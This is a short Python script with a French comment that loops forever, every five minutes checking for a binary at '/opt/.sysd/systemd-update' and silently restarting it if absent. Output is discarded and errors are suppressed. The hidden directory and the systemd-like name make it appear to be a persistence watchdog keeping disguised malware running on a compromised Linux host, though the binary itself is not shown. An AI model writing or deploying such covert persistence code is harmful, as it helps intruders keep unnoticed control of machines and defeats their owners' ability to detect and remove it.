#!/usr/bin/env python3
import os
import time
import subprocess

binary = "/opt/.sysd/systemd-update"
while True:
    try:
        # Vérifie si le process tourne
        result = subprocess.run(["pgrep", "-f", binary], stdout=subprocess.DEVNULL)
        if result.returncode != 0:
            subprocess.Popen([binary], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    time.sleep(300)  # 5 min
